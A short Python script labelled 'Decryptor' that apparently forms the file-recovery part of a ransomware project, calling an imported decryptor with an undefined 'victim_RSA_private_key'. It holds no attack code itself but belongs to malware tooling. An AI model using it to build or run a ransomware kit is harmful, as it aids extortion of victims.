# Date: 05/11/2022
# Author: DREAD.DR
# Description: Decryptor

from lib.decryptor import Decryptor


class FileDecryptor:

    def start(self):
        Decryptor(victim_RSA_private_key).start()


if __name__ == '__main__':
    FileDecryptor().start()
